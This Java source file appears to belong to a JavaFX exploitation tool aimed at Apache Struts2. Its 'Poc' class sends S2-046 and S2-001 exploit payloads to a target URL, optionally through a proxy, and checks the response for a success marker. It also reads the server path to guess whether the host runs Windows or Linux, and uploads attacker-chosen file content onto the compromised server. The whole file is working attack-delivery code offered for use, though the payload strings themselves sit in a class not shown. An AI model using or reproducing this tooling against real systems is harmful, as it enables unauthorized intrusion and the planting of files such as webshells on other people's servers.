package com.example.javafxdemo.Check;
import cn.hutool.http.HttpRequest;
import com.example.javafxdemo.Controller.ExecViewController;
import com.example.javafxdemo.Controller.SettingController;
import com.example.javafxdemo.HelloController;
import java.util.HashMap;
import java.util.Map;


public class Poc {

public static class checks {
    HashMap<String, String> heinfo = HelloController.helloinfo;

    public Boolean struts2046(HashMap<String, String> helloinfo,String vulnums) {
        String payload_post =helloinfo.get("POC"+vulnums);
        String results = Payload.PAYLOADSTR.results;
        String ua = helloinfo.get("UA");
        String cookie = helloinfo.get("Cookie");
        String target = helloinfo.get("vulurls");
        String proxy = helloinfo.get("Proxy");
        String methodFields = helloinfo.get("methodFields");
        byte[] xx = "".getBytes();
        String resp = "";
        if (proxy.equals("")) {
            HttpRequest req = HttpRequest.post(target).timeout(55000).form("x", xx, payload_post);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            //System.out.println(results);
            // System.out.println(resp.contains(results));
        } else {
            String proxyhost = proxy.split(":")[0];
            int port = Integer.parseInt(proxy.split(":")[1]);
            //System.out.println(payload_post);
            HttpRequest req = HttpRequest.post(target).timeout(55000).form("x", xx, payload_post);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .setHttpProxy(proxyhost, port)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            // System.out.println(results);
            // System.out.println(resp.contains(results));
            //System.out.println(req.getConnection());
        }
        if (resp.contains(results)) {
            String path=getpath(helloinfo,vulnums);
            HelloController.helloinfo.put("osType", (path.indexOf(":") == 1) ? "WIN" : "LIN");
            return true;
        } else {
            return false;
        }
    }

    public Boolean s2001(HashMap<String, String> helloinfo,String vulnums) {
        String payload_post =helloinfo.get("POC"+vulnums);
        String results = Payload.PAYLOADSTR.results;
        String ua = helloinfo.get("UA");
        String cookie = helloinfo.get("Cookie");
        String target = helloinfo.get("vulurls");
        String proxy = helloinfo.get("Proxy");
        String methodFields = helloinfo.get("methodFields");
        byte[] xx = "".getBytes();
        String resp = "";
        if (proxy.equals("")) {
            HttpRequest req = HttpRequest.post(target).timeout(55000).body(payload_post).setConnectionTimeout(55000);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            //System.out.println(results);
           // System.out.println(resp.contains(results));
        } else {
            String proxyhost = proxy.split(":")[0];
            int port = Integer.parseInt(proxy.split(":")[1]);
            //System.out.println(payload_post);
            HttpRequest req = HttpRequest.post(target).timeout(55000).body(payload_post).setConnectionTimeout(55000);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .setHttpProxy(proxyhost, port)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
           // System.out.println(results);
           // System.out.println(resp.contains(results));
            //System.out.println(req.getConnection());
        }
        if (resp.contains(results)) {
            String path=getpath(helloinfo,vulnums);
            HelloController.helloinfo.put("osType", (path.indexOf(":") == 1) ? "WIN" : "LIN");
            return true;
        } else {
            return false;
        }

    }
    public String getpath(HashMap<String, String> helloinfo,String vulnums){
        String results = Payload.PAYLOADSTR.results;
        String ua = helloinfo.get("UA");
        String cookie = helloinfo.get("Cookie");
        String target = helloinfo.get("vulurls");
        String proxy = helloinfo.get("Proxy");
        String methodFields = helloinfo.get("methodFields");
        String str2="";
        String resp = "";
        Map<String, String> vulInfo = Payload.builder()
                .selectModelAndVul("path","s"+vulnums)
                .VulInfo();
        String payload = vulInfo.get("payload");
        HttpRequest req = HttpRequest.post(target).timeout(55000).body(payload).setConnectionTimeout(55000);
        if (proxy.equals("")) {
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            String str1 = resp.substring(0, resp.indexOf("Body:"));
            str2 = resp.substring(str1.length() + 5);
            System.out.println(str2);
            return str2;
        }else {
            vulInfo = Payload.builder()
                    .selectModelAndVul("path", "s"+vulnums)
                    .VulInfo();
            String proxyhost = proxy.split(":")[0];
            int port = Integer.parseInt(proxy.split(":")[1]);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .setHttpProxy(proxyhost, port)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            String str1 = resp.substring(0, resp.indexOf("Body:"));
            str2 = resp.substring(str1.length() + 5);
            System.out.println(str2);
            return str2;
        }

    }
    public String uploadfile(HashMap<String, String> helloinfo,String vulnums,String vulmode) {
        String payload_post =helloinfo.get(vulmode+vulnums);
        String results = Payload.PAYLOADSTR.results;
        String ua = helloinfo.get("UA");
        String cookie = helloinfo.get("Cookie");
        String target = helloinfo.get("vulurls");
        String proxy = helloinfo.get("Proxy");
        String osType = helloinfo.get("osType");
        String rootfe=helloinfo.get("rootfe");
        String content= helloinfo.get("content");
        String methodFields = helloinfo.get("methodFields");
        byte[] xx = "".getBytes();
        String resp = "";
        if (proxy.equals("")) {
            Map<String, String> vulInfo = Payload.builder()
                    .selectModelAndVul(vulmode, "s"+vulnums)
                    .selectUpload(rootfe,content,"")
                    .VulInfo();
            String payload=vulInfo.get("payload");
            HttpRequest req = HttpRequest.post(target).timeout(55000).body(payload).setConnectionTimeout(55000);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            //System.out.println(results);
            // System.out.println(resp.contains(results));

        } else {
            String proxyhost = proxy.split(":")[0];
            int port = Integer.parseInt(proxy.split(":")[1]);
            Map<String, String> vulInfo = Payload.builder()
                    .selectModelAndVul(vulmode, "s"+vulnums)
                    .selectUpload(rootfe,content,"")
                    .VulInfo();
            String payload=vulInfo.get("payload");
            HttpRequest req = HttpRequest.post(target).timeout(55000).body(payload).setConnectionTimeout(55000);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .setHttpProxy(proxyhost, port)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            // System.out.println(results);
            // System.out.println(resp.contains(results));

        }
        System.out.println(resp.contains("200"));
        String str1 = resp.substring(0, resp.indexOf("Body:"));
        String str2 = resp.substring(str1.length() + 5);
        System.out.println(str2);
        return str2 + "\n";
    }
    public String s046upfile(HashMap<String, String> helloinfo,String vulnums,String vulmode) {
        String payload_post =helloinfo.get(vulmode+vulnums);
        String results = Payload.PAYLOADSTR.results;
        String ua = helloinfo.get("UA");
        String cookie = helloinfo.get("Cookie");
        String target = helloinfo.get("vulurls");
        String proxy = helloinfo.get("Proxy");
        String osType = helloinfo.get("osType");
        String rootfe=helloinfo.get("rootfe");
        String content= helloinfo.get("content");
        String methodFields = helloinfo.get("methodFields");
        byte[] xx = "".getBytes();
        String resp = "";
        if (proxy.equals("")) {
            Map<String, String> vulInfo = Payload.builder()
                    .selectModelAndVul(vulmode, "s"+vulnums)
                    .selectUpload(rootfe,content,"")
                    .VulInfo();
            String payload=vulInfo.get("payload");
            HttpRequest req = HttpRequest.post(target).timeout(55000).form("x", xx, payload_post);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            //System.out.println(results);
            // System.out.println(resp.contains(results));

        } else {
            String proxyhost = proxy.split(":")[0];
            int port = Integer.parseInt(proxy.split(":")[1]);
            Map<String, String> vulInfo = Payload.builder()
                    .selectModelAndVul(vulmode, "s"+vulnums)
                    .selectUpload(rootfe,content,"")
                    .VulInfo();
            String payload=vulInfo.get("payload");
            HttpRequest req = HttpRequest.post(target).timeout(55000).form("x", xx, payload_post);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .setHttpProxy(proxyhost, port)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
            // System.out.println(results);
            // System.out.println(resp.contains(results));

        }
        System.out.println(resp.contains("200"));
        String str1 = resp.substring(0, resp.indexOf("Body:"));
        String str2 = resp.substring(str1.length() + 5);
        System.out.println(str2);
        return str2 + "\n";
    }
}


}
